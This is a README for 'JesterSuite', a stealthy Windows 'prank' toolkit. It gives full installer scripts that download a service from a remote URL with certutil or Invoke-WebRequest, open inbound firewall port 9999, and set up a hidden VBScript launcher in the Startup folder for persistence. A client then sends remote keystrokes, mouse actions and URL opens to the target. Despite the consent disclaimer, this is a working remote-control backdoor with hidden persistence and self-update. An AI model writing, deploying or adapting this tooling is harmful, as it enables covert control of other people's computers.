# JesterSuite

**WARNING:** This software is designed strictly for **harmless pranks** on consenting targets. Use responsibly and at your own risk; you are fully liable for any outcomes.

---

## 📄 Overview

JesterSuite is a stealthy Windows prank toolkit featuring:

- **Prank Service:** Listens for remote commands to trigger chicanery (key presses, mouse jiggers, pop-ups, volume tweaks, simulated lag, URL opens, window minimization, etc.).
- **Auto-Update:** Service checks a remote URL periodically and auto-updates itself.
- **Auto-Startup Launcher:** Hidden VBScript loader that runs the service at logon.
- **Rich Client:** Interactive, colorful menu with scheduling and logging on your machine.
- **Health Check:** One-click environment tester that flags missing dependencies or misconfigurations.

---

## 📂 File Summary

| Component       | Filename                      |
|-----------------|-------------------------------|
| Prank Service   | `JesterService.pyw`           |
| Installer (Bat) | `Install-JesterSuite.bat`     |
| Installer (PS1) | `Install-JesterSuite.ps1`     |
| Launcher        | `JesterLauncher.vbs`          |
| Client          | `JesterClient.py`             |
| Health Check    | `JesterCheck.bat`             |

---

## 🚀 Quick Start

1. **Install Service**
   - On the **target PC**, run **either**:
     - `Install-JesterSuite.bat` (double-click)
     - `Install-JesterSuite.ps1` (PowerShell: `.\Install-JesterSuite.ps1`)
   - This will:
     - Create `%APPDATA%\PrankServer`
     - Install **PyAutoGUI**
     - Download `JesterService.pyw`
     - Open TCP port **9999** in the Windows Firewall

2. **Auto-Startup**
   - Copy `JesterLauncher.vbs` into the target user’s **Startup** folder:
     ```text
     Win+R → shell:startup → Enter
     ```

3. **Run Client**
   - On **your PC**, ensure Python 3.7+ is in `PATH`.
   - (Optional) `pip install colorama` for colored menus.
   - Launch:
     ```bash
     python JesterClient.py <TARGET_IP> [--port 9999]
     ```

---

## 🛠️ Setup Scripts

### 1. Batch Installer: `Install-JesterSuite.bat`
```bat
@echo off
setlocal
set "SCRIPT_URL=https://yourdomain.com/prank/JesterService.pyw"
set "INSTALL_DIR=%APPDATA%\PrankServer"
set "SCRIPT_PATH=%INSTALL_DIR%\JesterService.pyw"

:: Create directory
if not exist "%INSTALL_DIR%" (
  mkdir "%INSTALL_DIR%"
  echo ✓ Created %INSTALL_DIR%
) else (
  echo ℹ %INSTALL_DIR% exists
)

echo.
echo Downloading JesterService.pyw...
certutil -urlcache -split -f "%SCRIPT_URL%" "%SCRIPT_PATH%"
if exist "%SCRIPT_PATH%" (
  echo ✓ Downloaded to %SCRIPT_PATH%
) else (
  echo ✗ Download failed
  exit /b 1
)

echo.
echo Adding firewall rule...
netsh advfirewall firewall add rule name="PrankServer" dir=in action=allow protocol=TCP localport=9999

echo.
echo Install complete! Press any key to exit.
pause
endlocal
```

### 2. PowerShell Installer: `Install-JesterSuite.ps1`
```powershell
param([string]$Url = 'https://yourdomain.com/prank/JesterService.pyw')
$dir = "$env:APPDATA\PrankServer"
if (-Not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory }
Invoke-WebRequest -Uri $Url -OutFile "$dir\JesterService.pyw"
python -m pip install --user pyautogui
Try { New-NetFirewallRule -DisplayName 'PrankServer' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 9999 } Catch {}
Write-Host 'Installation finished.'
```

### 3. Auto-Startup Launcher: `JesterLauncher.vbs`
```vbscript
Option Explicit
Dim fso, wsh, scriptDir, svcPath
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsh = CreateObject("WScript.Shell")
scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
svcPath = scriptDir & "\JesterService.pyw"
wsh.Run "pythonw """ & svcPath & """", 0
```

### 4. Health-Check: `JesterCheck.bat`
```bat
@echo off
setlocal

set "INSTALL_DIR=%APPDATA%\PrankServer"
set "SVC=%INSTALL_DIR%\JesterService.pyw"
set "LAUNCHER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\JesterLauncher.vbs"
set "RULE=PrankServer"
set "PORT=9999"

echo Checking Python...
python --version >nul 2>&1 && echo ✓ Python found || echo ✗ Python missing

echo Checking PyAutoGUI...
python -c "import pyautogui" >nul 2>&1 && echo ✓ PyAutoGUI installed || echo ✗ Missing pyautogui

echo Checking service script...
if exist "%SVC%" (echo ✓ %SVC% present) else (echo ✗ JesterService.pyw missing)

echo Checking launcher...
if exist "%LAUNCHER%" (echo ✓ %LAUNCHER% present) else (echo ✗ JesterLauncher.vbs missing)

echo Checking firewall rule...
netsh advfirewall firewall show rule name="%RULE%" >nul 2>&1 && echo ✓ Rule present || echo ✗ Rule missing

echo Checking port listener...
for /f "tokens=5" %%P in ('netstat -aon ^| findstr LISTENING ^| findstr :%PORT%') do set PID=%%P
if defined PID (echo ✓ Port %PORT% listening (PID=!PID!)) else (echo ✗ No listener on %PORT%)

echo Health check complete.
pause
endlocal
```

---

## 💻 Client Setup & Usage

- **File:** `JesterClient.py`
- **Run:**
  ```bash
  python JesterClient.py <TARGET_IP> [--port 9999]
  ```
- **Features:** Colored menus, scheduling, logging, help screen, cancel schedules.

---

## ✨ New Client Features

See the **Features** section in the client for details on scheduling and logging.

---

## 🐞 Troubleshooting

- **Connection issues:** Verify IP, port `9999`, and firewall rule.
- **Python errors:** Ensure Python 3.7+ in PATH and `pyautogui` installed.
- **Auto-update fails:** Check URLs for `JesterService.pyw` and version manifest.

---

## 📜 License & Legal

MIT © YourName. No liability for misuse.
